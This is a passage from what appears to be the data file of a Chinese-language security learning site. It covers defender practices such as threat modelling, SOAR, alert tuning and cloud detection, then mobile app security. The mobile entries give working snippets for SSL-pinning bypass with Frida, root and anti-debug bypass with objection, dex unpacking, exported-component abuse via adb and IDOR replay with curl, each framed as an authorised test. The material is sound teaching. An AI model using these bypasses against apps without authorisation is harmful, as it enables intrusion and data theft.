          id: "blue-threat-model", name: "防守方威胁建模", level: "中级",
          summary: "先想「谁会怎么打我」，再决定监控什么、加固什么；防守资源要按最可能的路径投放。",
          keywords: ["威胁建模","攻击路径","资产","优先级","防守投入"],
          levels: {
            "入门": "防守也要先想清楚：我们最重要的东西是什么？对手最可能从哪进来？答案决定先补哪里。",
            "初级": "做法：列关键资产 → 列出可能入口（暴露面、账号、第三方）→ 给每条路径估概率与影响 → 决定监控与加固优先级。",
            "中级": "实战：结合真实威胁情报（行业常见手法）而不是泛泛而谈；对「高概率 + 高影响」的路径优先布检测与阻断。",
            "高级": "深入：威胁模型要随业务与攻击面变化更新（上线新系统、开放新接口），并作为检测覆盖度评估的输入。",
          },
          codeLang: "text",
          code:
`防守优先级矩阵（示例）
路径：VPN 弱口令 → 内网横向 → 核心数据库
可能性：高（VPN 暴露在公网）
影响：高（核心数据）
动作：强制 MFA + 数据库访问收紧 + 横向检测规则`,
          tool: "威胁建模模板、情报订阅",
          refs: "防守方威胁建模"
        },
        {
          id: "blue-automation", name: "安全自动化与 SOAR", level: "中级",
          summary: "自动化搬运、人工判断：把重复动作交给机器，把有副作用的动作留给确认。",
          keywords: ["自动化","soar","编排","剧本","确认","提效"],
          levels: {
            "入门": "每天重复的处置动作（查情报、拉日志、封 IP）可以自动化，人只做判断。",
            "初级": "适合自动化的动作：情报查询、日志上下文拉取、告警富化、通知与工单创建、以及低风险封禁（有白名单）。",
            "中级": "实战：先从「高频 + 低风险 + 明确判据」的场景开始（如封禁已知恶意 IP、隔离已确认恶意文件），保留人工确认兜底。",
            "高级": "深入：自动化的风险是「自动化了错误的判断」——因此要有白名单、可回滚、执行留痕与失败告警，并定期抽查执行结果。",
          },
          codeLang: "text",
          code:
`自动化优先级（示例）
可自动：拉情报 / 富化资产 / 建工单 / 通知
需确认：隔离主机 / 禁用账号 / 删除邮件
禁止自动：批量权限变更 / 数据删除
原则：低风险先自动，高影响留确认`,
          tool: "SOAR、脚本编排、工单系统",
          refs: "安全自动化实践"
        },
        {
          id: "blue-report", name: "安全报告与向上沟通", level: "初级",
          summary: "管理层要的是风险与趋势，不是告警条数；报告要能支撑决策与资源投入。",
          keywords: ["报告","沟通","指标","风险","决策"],
          levels: {
            "入门": "给领导汇报安全，重点不是「我们处理了多少告警」，而是「哪些风险在上升、需要什么支持」。",
            "初级": "报告结构：关键风险与影响、趋势变化（变好还是变差）、重要事件与处置结果、需要的决策或资源。",
            "中级": "实战：用少量核心指标（关键资产覆盖、MTTD/MTTR、漏检复盘数）说明趋势；把技术问题翻译成业务语言（停服风险、数据泄露影响）。",
            "高级": "深入：把安全目标与业务目标对齐（如上线安全评审率、供应链风险收敛），让安全投入可被评估与持续支持。",
          },
          codeLang: "text",
          code:
`月报骨架（一页）
1) 本期关键风险（3 条以内，带影响）
2) 趋势：MTTD/MTTR、覆盖率、漏检复盘数
3) 重大事件：根因 + 已采取措施
4) 需要决策：预算/人力/业务配合项`,
          tool: "指标看板、汇报模板",
          refs: "安全汇报实践"
        },
        {
          id: "blue-alert-tuning", name: "告警治理与降噪", level: "中级",
          summary: "告警太多等于没有告警；治理靠「按噪音排序 + 上下文富化 + 承认与抑制」。",
          keywords: ["告警治理","降噪","误报","抑制","富化","优先级"],
          levels: {
            "入门": "每天几千条告警，人只会挑着看——真事就埋在里面了。先把最吵的几条治掉，效果立竿见影。",
            "初级": "方法：统计噪音 Top 规则 → 查根因（是规则太宽还是缺上下文）→ 加白名单/富化/调阈值；对已知无害的做「承认」并设到期。",
            "中级": "实战：把重复告警聚合成一个事件（同一根因）、把资产与账号上下文自动挂上、把无法处置的规则直接下架。",
            "高级": "深入：降噪不能靠「关掉」——要区分「没价值」与「没上下文」；后者补数据即可变有用。指标看准确率与漏检复盘，而非关闭数量。",
          },
          codeLang: "text",
          code:
`降噪四步
1) 统计：哪几条规则贡献了 80% 的告警量？
2) 归因：规则太宽 / 缺上下文 / 已知合法行为
3) 处置：调规则 / 富化 / 白名单 / 承认（带到期）
4) 复核：改善后准确率与漏检是否变好
`,
          tool: "SIEM 统计、富化平台、工单",
          refs: "告警治理实践"
        },
        {
          id: "blue-oncall", name: "值班与交接规范", level: "初级",
          summary: "值班靠流程不靠英雄：分级、升级、交接与复盘四件事写清楚，夜里才不会乱。",
          keywords: ["值班","交接","升级","sla","复盘"],
          levels: {
            "入门": "值班就是「这段时间由谁盯着、出多大事找谁」。没写清楚，半夜就只能挨个打电话。",
            "初级": "要素：告警分级（P1-P4）、各级响应 SLA、升级链（一线→二线→负责人）、值班交接清单与复盘机制。",
            "中级": "实战：交接必须含未闭环事项与临时抑制规则到期时间；复盘要落成剧本或规则改进项，否则同类事件反复消耗人力。",
            "高级": "深入：值班质量用指标看（响应中位时长、升级及时率、漏检数），并关注值班人员负荷——疲劳是漏判的主要来源。",
          },
          codeLang: "text",
          code:
`交接清单（最小集）
· 未闭环告警：编号 / 等级 / 现状 / 下一步 / 联系人
· 进行中事件与已通知对象
· 临时抑制规则（何时到期、谁负责撤销）
· 本班新增情报与重点监控目标
`,
          tool: "工单系统、值班表、预案",
          refs: "安全运营值班实践"
        },
        {
          id: "blue-evidence", name: "证据保全与工单留痕", level: "中级",
          summary: "处置结论要能被复核：留什么、怎么留、存多久，决定了事后能否复盘与定责。",
          keywords: ["证据","留痕","取证链","工单","复核"],
          levels: {
            "入门": "处理完一件事要留下「为什么这么判断」的记录，否则过几天谁也想不起当时怎么回事。",
            "初级": "留痕内容：告警原文与时间、查询语句与结果、判断依据、处置动作与执行者、结论。命令与截图比口头描述可靠。",
            "中级": "实战：对涉及主机/账号的操作先固定证据再动手（内存/日志），并把关键证据附加到工单；证据文件要记哈希与来源。",
            "高级": "深入：证据链要可追溯（谁在何时采集、如何保存）；涉及法律或监管时按取证规范执行，避免因流程瑕疵导致证据不可用。",
          },
          codeLang: "text",
          code:
`工单留痕模板
告警：<原文 + 时间>
查询：<语句 + 关键结果>
判断：<依据，含反证考虑>
动作：<谁在何时执行了什么>
结论：<真实事件/误报 + 原因 + 改进项>
`,
          tool: "工单系统、取证工具、哈希校验",
          refs: "应急留痕与取证规范"
        },
        {
          id: "blue-cloud", name: "云上检测接入", level: "中级",
          summary: "云上「主机看不见、流量摸不到」，检测重心转向控制面审计、云原生遥测与身份行为。",
          keywords: ["云检测","审计日志","身份行为","云原生","接入"],
          levels: {
            "入门": "云上服务器不再是自己机房的机器，很多攻击直接从控制台和 API 发生——所以要盯「谁在调什么接口」。",
            "初级": "必接数据：云操作审计、身份与权限变更、密钥使用、存储策略变更、WAF/负载均衡日志、容器与编排审计。",
            "中级": "实战：为高危动作设告警（创建管理员、开放公网、关日志、导出密钥）；对「异常来源 + 高权身份 + 敏感动作」组合重点监控。",
            "高级": "深入：多账号集中到只追加的独立账号，防止业务侧删日志；把控制面与主机/网络数据在 SIEM 关联，才能还原完整攻击链。",
          },
          codeLang: "text",
          code:
`云上检测优先级
P0：权限与身份变更（建管理员、改策略、建密钥）
P0：审计日志配置被修改（攻击者想隐身）
P1：网络策略放宽到 0.0.0.0/0
P1：存储策略变更为公开
P2：非常用地区/时段的控制台登录
`,
          tool: "云审计、SIEM、告警规则",
          refs: "云上安全运营实践"
        },
        {
          id: "blue-comm", name: "事件沟通与对外口径", level: "初级",
          summary: "事件中「说什么、谁来说、什么时候说」同样影响损失；沟通失误会带来二次伤害。",
          keywords: ["沟通","对外口径","通报","客服","舆情"],
          levels: {
            "入门": "出事时不只要修技术，还要想清楚「怎么跟用户和领导说」——说错了比不说更麻烦。",
            "初级": "要素：统一发言人、事实清单（已确认/待确认）、对外通报模板、客服问答口径、内部同步频率。",
            "中级": "实战：对外只说已确认的事实与已采取的措施，避免猜测与过度承诺；提前准备客服话术，否则一线会被问崩。",
            "高级": "深入：按合规要求判断是否需向监管与用户通报及时限；对媒体与舆情有统一出口，避免多口径矛盾引发信任危机。",
          },
          codeLang: "text",
          code:
`事件沟通包（提前准备）
· 事实清单：已确认 / 待确认（明确区分）
· 对外通报模板：影响面 + 已采取措施 + 用户建议
· 客服 FAQ（10 条高频问题与标准答复）
· 发言人指定与内部同步节奏
`,
          tool: "沟通模板、客服话术、通报流程",
          refs: "事件沟通实践"
        },
      ]
    },
    /* ---------------- 移动安全 ---------------- */
    {
      id: "mobile", name: "移动安全", icon: "📱",
      desc: "覆盖 Android 与 iOS 的客户端逆向、组件与 WebView 风险、本地数据保护、接口越权与恶意样本分析。",
      topics: [
        {
          id: "mobile-attack-surface", name: "移动应用攻击面", level: "入门",
          summary: "移动端与 Web 的风险面完全不同：客户端可被逆向、数据落在用户设备上、接口暴露在公网。",
          keywords: ["移动安全","android","ios","攻击面","逆向","客户端"],
          levels: {
            "入门": "手机应用的安全和网站不一样：网站代码在服务器上你摸不到，而 App 装在用户手机里，别人可以拆开来看。所以客户端里不能放秘密（密钥、算法逻辑），只当它是不可信的。",
            "初级": "三条主线：① 客户端（反编译、调试、改包）；② 数据（本地文件、日志、剪贴板、备份）；③ 通信与接口（抓包、证书校验、接口越权）。安全评估通常三条线一起走。",
            "中级": "实战思路：先看清单与权限（声明了哪些敏感能力）、再拆包看组件导出与硬编码、然后抓包分析接口、最后动态挂钩（Frida）验证逻辑绕过。输出以「可复现的利用路径 + 修复建议」为准。",
            "高级": "深入要考虑业务逻辑漏洞（如订单/积分/风控绕过）、设备指纹与风控对抗、多端一致性问题（同一接口 Web 校验严格而 App 宽松），以及合规要求（个人信息最小化收集）。",
          },
          codeLang: "bash",
          code:
`# 先看清应用基本信息（只在你拥有授权的应用上做）
aapt dump badging app.apk | head -20     # 包名、版本、权限
apktool d app.apk -o app_src             # 反编译资源与清单
# 关键点：清单里的 exported=true 组件就是对外入口`,
          tool: "jadx、apktool、MobSF、Frida、Burp Suite",
          refs: "OWASP MASVS / MASTG"
        },
        {
          id: "apk-sign", name: "应用签名与重打包", level: "初级",
          summary: "签名保证「这个包确实由该开发者发布」；改成自己的签名就是一次新的发包，用户会看到签名不一致。",
          keywords: ["签名","重打包","改包","v1签名","v2签名","校验"],
          levels: {
            "入门": "每个 App 都带一个「数字签名」，像封条。别人把内容改了再封一次，封条就不一样了，系统一对比就知道被动过。",
            "初级": "重打包流程：反编译 → 改代码/资源 → 重新打包 → 用**自己的**密钥签名。因为签名变了，原应用无法升级覆盖，但可以诱导用户单独安装。加固与完整性校验就是为了提高这一步的成本。",
            "中级": "实战：签名校验常写在 Java 层（getPackageInfo 的 signatures）或 native 层；Java 层用 Frida hook 返回值即可绕过。v2/v3 签名覆盖整个 APK，篡改后签名直接失效，所以改包后必须重签名。",
            "高级": "进阶对抗：签名校验分散在多处 + 与 native 交叉验证、运行时自校验（校验自身 dex 哈希）。破解思路是定位校验点批量 nop 或统一 hook，同时在测试报告里指出「客户端校验只能提高成本，不能作为唯一防线」。",
          },
          codeLang: "bash",
          code:
`# 重打包需要重新签名（示例密钥仅用于测试）
keytool -genkey -v -keystore my.keystore -alias t -keyalg RSA -keysize 2048 -validity 365
apksigner sign --ks my.keystore --out app-signed.apk app-unsigned.apk
apksigner verify -v app-signed.apk    # 验证签名`,
          tool: "apksigner、jarsigner、keytool、apktool",
          refs: "Android 官方签名文档；OWASP MASTG"
        },
        {
          id: "component-export", name: "组件导出与 Intent 劫持", level: "初级",
          summary: "Android 四大组件若 exported=true 就会被其它应用调用；权限校验缺失时可越权启动、读数据、发广播。",
          keywords: ["组件导出","intent","activity","service","broadcast","provider","越权"],
          levels: {
            "入门": "App 内部有很多「门」，有些门是给外部开的（比如分享、扫码）。如果开着的门后面是敏感功能且不查身份，别的应用就能直接进去。",
            "初级": "常见问题：Activity 被导出且无校验（可被拉起敏感页面）、Service 导出可被任意调用、BroadcastReceiver 可被伪造广播触发、ContentProvider 导出导致任意读文件（如目录穿越）。",
            "中级": "实战：读 AndroidManifest 找 exported=true 与 intent-filter，用 adb 直接拉起验证：am start -n 包名/组件、am broadcast 发广播、content query 读 Provider。确认是否需要权限或校验。",
            "高级": "深入：Provider 的路径穿越（../ 拼接）、PendingIntent 误用导致的权限提升、以及隐式 Intent 被恶意应用抢占（加白名单校验）。修复原则：默认不导出 + 导出必校验权限与调用方。",
          },
          codeLang: "bash",
          code:
`# 用 adb 验证导出组件是否可被外部调用（授权测试）
adb shell am start -n com.example/.SecretActivity
adb shell am broadcast -a com.example.ACTION_X --ez flag true
adb shell content query --uri content://com.example.provider/users`,
          tool: "adb、jadx、drozer",
          refs: "Android 组件安全文档；OWASP MASTG"
        },
        {
          id: "webview", name: "WebView 与 JS 桥安全", level: "中级",
          summary: "WebView 同时有网页和原生能力，配置不当会让恶意页面调用原生接口（JS 桥）或读取本地文件。",
          keywords: ["webview","jsbridge","addJavascriptInterface","xss","file协议","加载url"],
          levels: {
            "入门": "App 里内嵌的网页（WebView）像个小浏览器。如果它既能上外网、又装着「调用 App 功能」的桥，那恶意网页就可能顺着桥去动 App 的数据。",
            "初级": "三个高危配置：JavaScript 已开启 + addJavascriptInterface 暴露对象（低版本可反射调用任意类）、允许 file:// 加载本地文件、对 URL 白名单不严（可加载攻击者页面）。",
            "中级": "实战路径：先确认 WebView 加载的 URL 是否可控（deeplink 参数、扫码、推送）；若可控，构造页面调用 JS 桥方法做越权；再配合 file 协议读取本地敏感文件。",
            "高级": "深入：桥方法的参数校验缺失可导致任意文件读写/命令执行；WebView 与原生双向信任要按「不可信输入」处理。修复：严格 URL 白名单、关闭不必要接口、@JavascriptInterface 白名单暴露、禁 file 协议。",
          },
          codeLang: "java",
          code:
`// 危险：暴露原生对象给网页（恶意页面可调用其中所有方法）
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new Bridge(), "app");

// 修复方向：只暴露必要方法 + 校验调用来源 URL + 严格白名单
webView.loadUrl("https://trusted.example.com");`,
          tool: "jadx、Frida、Burp Suite（改包注入页面）",
          refs: "OWASP MASTG；Android WebView 安全指南"
        },
        {
          id: "local-storage", name: "本地存储与数据泄露", level: "入门",
          summary: "App 写在本地的文件、数据库、日志、剪贴板都可能留敏感信息，设备被 Root 或备份导出即可读。",
          keywords: ["本地存储","sharedpreferences","sqlite","日志","剪贴板","备份","数据泄露"],
          levels: {
            "入门": "App 会把配置、缓存、登录信息写在手机存储里。手机如果被别人拿到（或对方有 Root 权限），这些文件就是公开的。",
            "初级": "常见落点：SharedPreferences（明文键值对）、SQLite 数据库、缓存目录、日志（logcat 打印口令/令牌）、剪贴板、外部存储（任何应用可读）。",
            "中级": "实战：adb 备份或直接读 /data/data/包名（需 Root）；检索关键字 token/password/key；检查是否写入外部存储与是否可被备份（allowBackup=true 时可在非 Root 设备上导出）。",
            "高级": "深入：加固要点是「敏感数据不落地」——用 Keystore/Keychain 保管密钥、加密存储、禁止敏感日志、关闭 allowBackup、对外部存储零信任。合规上还涉及个人信息最小化与脱敏。",
          },
          codeLang: "bash",
          code:
`# 在有授权的测试设备上查看应用私有数据（通常需 root 或 debuggable 包）
adb shell run-as com.example cat /data/data/com.example/shared_prefs/auth.xml
adb logcat | grep -i -E "token|password|secret"    # 检查是否打印敏感信息`,
          tool: "adb、Frida、MobSF",
          refs: "OWASP MASVS-STORAGE"
        },
        {
          id: "ssl-pinning", name: "证书校验与中间人", level: "初级",
          summary: "只靠系统信任链，用户装上自签根证书就能抓包；证书固定（pinning）把信任范围收窄到指定证书。",
          keywords: ["https","证书固定","pinning","中间人","抓包","burp","信任链"],
          levels: {
            "入门": "https 靠「证书」确认对面是真正的服务器。如果手机被安装了假的根证书，代理就能解密流量——证书固定就是进一步指定「我只信这张证书」。",
            "初级": "默认校验证书链 + 域名；若 App 未做额外固定，在测试设备上安装代理根证书即可抓包。做了 pinning 后代理会握手失败。",
            "中级": "实战：遇到 pinning 失败，常见绕过点是 Java 层 X509TrustManager / HostnameVerifier 的 hook，或 okhttp 的 CertificatePinner。用 Frida 脚本统一 hook 掉校验。",
            "高级": "深入：native 层校验（BoringSSL/自定义 libcurl）需要 hook 更底层函数；双向 TLS（mTLS）与证书透明度是更强的方案。注意：抓包绕过是测试手段，报告里要说明「服务端仍需鉴权与风控」。",
          },
          codeLang: "javascript",
          code:
`// Frida：绕过 Java 层证书校验（仅用于你拥有授权的测试）
Java.perform(function () {
  var TM = Java.use("javax.net.ssl.X509TrustManager");
  var Impl = Java.registerClass({
    name: "bypass.TM", implements: [TM],
    methods: {
      checkClientTrusted: function () {},
      checkServerTrusted: function () {},
      getAcceptedIssuers: function () { return []; }
    }
  });
  // 结合 SSLContext 注入 Impl 使用
});`,
          tool: "Frida、objection、Burp Suite、mitmproxy",
          refs: "OWASP MASTG-NETWORK"
        },
        {
          id: "dynamic-debug", name: "动态调试与反调试", level: "中级",
          summary: "动态分析在运行时看真实行为；反调试（检测调试器/ptrace/时间差）用来提高分析成本。",
          keywords: ["动态调试","frida","xposed","ptrace","反调试","hook","jdb"],
          levels: {
            "入门": "静态看代码像看说明书，动态调试是把 App 跑起来看它实际做了什么——输入什么、返回什么、关键判断在哪一步。",
            "初级": "手段：adb + jdb 附加调试（需 debuggable）、Frida 注入 hook 函数、Xposed/LSPosed 改行为。反调试则是 App 主动检测：检测调试端口、ptrace 自附加、检测 Frida 端口与库名。",
            "中级": "实战：先判断是否可调试（debuggable 标志、ro.debuggable）；被反调试拦下时，定位检测函数并 hook 返回假值（如 ptrace 返回 0、检测到 frida 的字符串改掉）。",
            "高级": "深入：native 反调试（自 ptrace、检测 TracerPid、时间差、信号）、多线程检测与延迟触发；对抗思路是 patch + hook 组合，并在报告中强调「反调试只增加成本」。",
          },
          codeLang: "bash",
          code:
`# Frida 快速附着与常用脚本（授权测试）
frida-ps -U | grep -i 包名
frida -U -f com.example -l bypass.js --no-pause

# objection 一行绕过常见检测
objection -g com.example explore --startup-command "android root disable" `,
          tool: "Frida、objection、jdb、IDA/Ghidra",
          refs: "Frida 文档；OWASP MASTG-RESILIENCE"
        },
        {
          id: "root-detect", name: "Root 检测与绕过", level: "中级",
          summary: "Root 让攻击者能读私有数据、挂载 hook；检测手段多样但都可被绕过，属于「提高成本」类防护。",
          keywords: ["root","magisk","检测","绕过","su","busybox","完整性"],
          levels: {
            "入门": "Root 相当于手机的最高管理员权限。App 里敏感功能会先问一句「这台手机是不是被 Root 了」，是的话就拒绝运行。",
            "初级": "常见检测点：su 二进制路径、BusyBox、系统分区可写、Magisk 痕迹、SafetyNet/Play Integrity 校验、以及执行 su 命令的成功与否。",
            "中级": "实战：在 Magisk 里开启隐藏（DenyList/Zygisk + Shamiko）、重命名 su、用 Frida hook 检测函数返回假值。通常先跑一遍看哪一项触发，再定点处理。",
            "高级": "深入：完整性校验已上移到云端（Play Integrity API），本地隐藏会失效；这类对抗是军备竞赛。评估结论应写清「检测可被绕过，真正的防线是服务端风控与最小数据落地」。",
          },
          codeLang: "bash",
          code:
`# 查看当前 root 痕迹（授权测试设备）
adb shell which su; adb shell ls /system/xbin/su
adb shell getprop ro.debuggable; adb shell getprop ro.secure

# Magisk 隐藏：DenyList / Zygisk + 重命名包名后再验证`,
          tool: "Magisk、Shamiko、Frida、Play Integrity",
          refs: "OWASP MASTG-RESILIENCE"
        },
        {
          id: "app-hardening", name: "加固与脱壳", level: "高级",
          summary: "加固通过加密 dex、壳、混淆、反调试提高逆向成本；脱壳就是在内存里把真实代码还原出来。",
          keywords: ["加固","壳","脱壳","ollvm","混淆","dex","dump","frida-dexdump"],
          levels: {
            "入门": "「加固」是把代码锁进一个盒子，运行时才打开。逆向的人要先把盒子打开（脱壳）才能看到真正的代码。",
            "初级": "常见加固手段：dex 加密（运行时解密加载）、整体壳/抽取壳、VMP、OLLVM 控制流平坦化、字符串加密、资源混淆。",
            "中级": "实战脱壳：在解密完成、代码已加载到内存时 dump（Frida-dexdump、fart、基于 ART 的 dump），再修复 dex 头与提取代码，然后交给 jadx 反编译。",
            "高级": "深入：指令抽取型壳需要运行时重建；VMP 需动态 trace 还原语义；OLLVM 靠去平坦化与符号执行。工程化做法是自动化 dump + 批量修复，同时评估加固带来的真实收益。",
          },
          codeLang: "bash",
          code:
`# 运行时脱壳思路（授权测试）
# 1) 用 frida-dexdump 在应用启动后 dump 内存中的 dex
frida-dexdump -U -f com.example
# 2) 修复后的 dex 用 jadx 反编译查看真实逻辑
jadx-gui dumped/`,
          tool: "frida-dexdump、FART、Ghidra、jadx",
          refs: "OWASP MASTG-RESILIENCE；脱壳技术综述"
        },
        {
          id: "ios-basics", name: "iOS 应用安全基础", level: "初级",
          summary: "iOS 沙盒更严格，但 IPA 同样可被重签名安装、Keychain 与 plist 是重点关注对象。",
          keywords: ["ios","ipa","重签名","keychain","plist","沙盒","越狱"],
          levels: {
            "入门": "iPhone 上的应用被关在自己的「沙盒」里，互相看不到数据。但拿到安装包（IPA）后同样可以拆开分析结构、资源和配置。",
            "初级": "关注点：IPA 解包后的 Info.plist 与配置（URL Scheme、ATS 例外）、Keychain 存储、NSUserDefaults、日志、以及是否可被重签名后安装到非越狱设备。",
            "中级": "实战：class-dump 看类与方法、Hopper/Ghidra 反编译、未加密的二进制可直接静态分析；越狱设备上可用 Frida 做运行时 hook。",
            "高级": "深入：ATS 配置放宽带来的明文风险、URL Scheme 被劫持、Keychain 访问组误配、以及企业证书/描述文件滥用带来的分发风险。",
          },
          codeLang: "bash",
          code:
`# IPA 结构与静态检查（授权测试）
unzip -o app.ipa -d ipa_out
plutil -p ipa_out/Payload/*.app/Info.plist | head -30   # 看 ATS / URL Scheme
# 检查二进制是否加密（cryptid=1 表示已加密，需在设备上解密后分析）
otool -l ipa_out/Payload/*.app/AppBinary | grep -A2 crypt`,
          tool: "class-dump、Hopper、Ghidra、Frida、plutil",
          refs: "OWASP MASTG（iOS 部分）"
        },
        {
          id: "jailbreak-detect", name: "越狱检测与绕过", level: "中级",
          summary: "越狱后沙盒与签名校验被削弱，检测手段（文件/URL Scheme/沙盒完整性）同样可被绕过。",
          keywords: ["越狱","jailbreak","cydia","检测","绕过","沙盒"],
          levels: {
            "入门": "越狱就是解除 iPhone 的系统限制。App 会用各种办法判断「这台设备是不是被越狱了」，是就限制功能。",
            "初级": "检测点：Cydia/越狱应用路径、可写的系统目录、可疑 URL Scheme（cydia://）、fork 是否可用、沙盒完整性检查。",
            "中级": "实战：越狱设备上用 Frida hook 检测函数或直接改文件系统指纹；也可用「越狱隐藏」类插件通过检测。重点是确认绕过能否带来真实越权。",
            "高级": "深入：检测与绕过长期对抗，无法彻底防；评估应聚焦「越狱后攻击者能得到什么」（Keychain、内存、hook），并把防线放在服务端与数据最小化上。",
          },
          codeLang: "bash",
          code:
`# 越狱迹象检查（授权测试）
ls /Applications/Cydia.app /usr/sbin/sshd 2>/dev/null
# 用 Frida hook 常见检测函数
frida -U -f com.example -l jb_bypass.js`,
          tool: "Frida、objection、Liberty Lite",
          refs: "OWASP MASTG-RESILIENCE（iOS）"
        },
        {
          id: "mobile-api", name: "移动端 API 接口风险", level: "中级",
          summary: "接口是移动端最有价值的目标：越权、批量枚举、参数篡改、签名算法泄露都出在这一层。",
          keywords: ["api","越权","idor","参数篡改","签名","批量枚举","风控"],
          levels: {
            "入门": "App 显示的数据都来自服务器接口。客户端能被改，所以接口必须自己判断「你有没有权限」，不能靠 App 界面藏起来。",
            "初级": "典型问题：水平越权（改 id 看别人数据）、垂直越权（普通用户调管理接口）、参数篡改（金额/数量/角色）、无限流可批量枚举手机号或订单号。",
            "中级": "实战：抓包拿接口清单 → 用不同账号交叉验证越权 → 检查签名/加密参数如何生成（常在客户端硬编码或可逆）→ 验证是否可重放、是否有频率限制。",
            "高级": "深入：客户端签名只能防「改包」，不能防「重放与脚本化」；风控需服务端行为建模。评估结论要给出「服务端鉴权 + 参数不可信 + 限流幂等」的修复优先级。",
          },
          codeLang: "bash",
          code:
`# 抓包与重放（授权测试）
# 1) 代理抓取接口；2) 用不同账号替换 id/token 验证越权
curl -X GET "https://api.example.com/v1/orders/1002" -H "Authorization: Bearer <另一账号 token>"
# 3) 检查是否可批量：同一接口连打 100 次看是否限流`,
          tool: "Burp Suite、mitmproxy、Postman",
          refs: "OWASP API Security Top 10"
        },
        {
          id: "mobile-malware", name: "移动恶意样本分析", level: "高级",
          summary: "移动恶意软件以窃取凭据、短信/验证码、静默订阅为主要目的；分析要兼顾静态特征与运行时行为。",
          keywords: ["恶意样本","短信拦截","无障碍服务","静默订阅","家族","ioc"],
          levels: {
            "入门": "有些 App 装上去就想偷东西：偷短信验证码、偷通讯录、偷偷扣费。分析样本就是搞清它到底干了什么。",
            "初级": "常见手法：申请无障碍服务（Accessibility）做自动点击与读屏窃取、短信/通话权限、动态加载 dex 躲避检测、伪装成正常工具类应用。",
            "中级": "分析流程：静态看权限与网络域名（IOC 提取）→ 沙箱或真机运行观察行为 → 抓包看 C2 与上报格式 → 输出家族特征与检测规则。",
            "高级": "深入：多阶段载荷（下载器 + 二次加载）、加固与反分析、C2 域名生成算法（DGA）、以及在企业侧的检测落地（EDR 规则、网络 IOC、MTD 移动威胁防御）。",
          },
          codeLang: "bash",
          code:
`# 静态快速提取 IOC（授权分析，样本隔离环境）
strings sample.apk | grep -Eo "https?://[a-zA-Z0-9./_-]+" | sort -u | head
# 清单里的敏感权限
aapt dump permissions sample.apk`,
          tool: "MobSF、jadx、Frida、Cuckoo/沙箱",
          refs: "OWASP MASTG；移动恶意软件分析实践"
        },
        {
          id: "mob-anatomy", name: "一个 App 里都有什么", level: "入门",
          summary: "界面代码、资源、配置清单与本地数据：了解结构才知道哪些东西能被别人看到。",
          keywords: ["apk","ipa","结构","资源","清单","本地数据"],
          levels: {
            "入门": "手机 App 其实是一个压缩包：里面装着界面、图片、配置和代码。装到手机上后，它还会在本地存配置和缓存。",
            "初级": "Android 的 APK 里有：资源（图片/布局）、代码（dex）、配置清单（权限与组件声明）、签名信息。iOS 的 IPA 结构类似（Payload 里的 .app 目录）。",
            "中级": "实战：解包后先看配置清单（声明了哪些权限、哪些组件对外可调用），再找硬编码的地址与密钥，最后看本地数据目录里存了什么。",
            "高级": "深入：客户端里的一切都可能被看到，所以设计上必须假设「攻击者拿到完整包」；真正的秘密（密钥、判定逻辑）应放在服务端。",
          },
          codeLang: "bash",
          code:
`# 解包看结构（授权测试）
unzip -l app.apk | head -20
apktool d app.apk -o out && ls out            # 资源与清单
# 关键文件：out/AndroidManifest.xml（权限与导出组件）`,
          tool: "apktool、jadx、7-Zip",
          refs: "移动应用结构；OWASP MASTG"
        },
        {
          id: "mob-permission", name: "App 安装与权限入门", level: "入门",
          summary: "权限是 App 触碰隐私的许可；用户与安全人员都要会看「它为什么需要这个权限」。",
          keywords: ["权限","隐私","安装","敏感权限","最小必要","申请"],
          levels: {
            "入门": "App 要读通讯录、拍照、定位，都得先向你申请权限。看到一个手电筒 App 要读短信，就该警惕了。",
            "初级": "敏感权限：位置、通讯录、短信、相机麦克风、存储、无障碍服务。判断方法：这个功能和它声称的用途匹配吗？",
            "中级": "实战：检查 App 申请的权限是否与功能相符、是否在运行时按需申请（而非启动就要全部）、无障碍与设备管理权限是否被滥用（常见于恶意样本与自动化点击）。",
            "高级": "深入：权限滥用常和「信息收集最小必要」冲突，评估时要对照隐私政策与实际采集行为；企业侧还可用 MDM 限制高风险权限。",
          },
          codeLang: "text",
          code:
`权限自查三问
1) 这个权限与 App 声称的功能相关吗？
2) 是否只在用到功能时才申请？
3) 拒绝后 App 是否仍能正常使用核心功能？
（不符 → 存在过度收集风险）`,
          tool: "系统权限管理页、MDM、权限分析工具",
          refs: "移动隐私与权限实践"
        },
        {
          id: "mob-reverse", name: "移动逆向实战流程", level: "高级",
          summary: "从静态摸底到动态验证：定位关键逻辑、验证绕过效果、输出可复现结论。",
          keywords: ["逆向流程","静态","动态","frida","验证","报告"],
          levels: {
            "入门": "逆向就是「拆开 App 看它怎么判断」，然后用动态手段验证判断是否可被绕过。",
            "初级": "流程：解包看清单与资源 → 反编译找关键逻辑（登录、签名、风控）→ 动态 hook 验证 → 记录复现步骤。",
            "中级": "实战：优先追踪「客户端做安全判断」的位置（本地校验、硬编码密钥、明文协议），因为这类判断最容易被绕过且影响大。",
            "高级": "深入：遇到加固/混淆时先脱壳再去平坦化；同时把结论落到「服务端应如何补强」，避免只停留在「客户端可被绕过」。",
          },
          codeLang: "text",
          code:
`移动逆向记录模板
目标：登录流程中的本地校验
静态：定位校验函数（jadx 搜索关键字）
动态：Frida hook 返回真值 → 观察是否放行
结论：客户端校验可绕过（附复现）
建议：服务端做风控与限速，客户端只做体验优化`,
          tool: "jadx、Frida、objection",
          refs: "移动逆向实践"
        },
        {
          id: "mob-mdm", name: "企业移动管理与合规", level: "中级",
          summary: "企业设备上的 App 与数据需要统一管控：准入、隔离与远程擦除是三项基础能力。",
          keywords: ["mdm","企业设备","准入","隔离","远程擦除","合规"],
          levels: {
            "入门": "员工用手机办公时，公司需要能管住「设备是否合规、数据能不能带走」。MDM 就是这套管理系统。",
            "初级": "能力：设备合规检查（是否越狱/是否加密）、应用分发与白名单、数据隔离（企业数据与个人数据分开）、丢失时远程擦除企业数据。",
            "中级": "实战：落地要平衡隐私（个人数据不监控）与安全（企业数据可控）；对敏感应用启用「仅合规设备可访问」策略。",
            "高级": "深入：与零信任结合——设备状态作为访问决策输入；同时管理好证书与配置文件分发，避免成为新的攻击面。",
          },
          codeLang: "text",
          code:
`MDM 三项基础能力
1) 准入：不合规设备（越狱/未加密）拒绝访问企业数据
2) 隔离：企业数据容器化，个人数据不监控
3) 处置：设备丢失可远程擦除企业数据（不影响个人数据）`,
          tool: "MDM 平台、零信任接入",
          refs: "企业移动管理实践"
        },
        {
          id: "mob-crypto", name: "客户端数据加密实践", level: "中级",
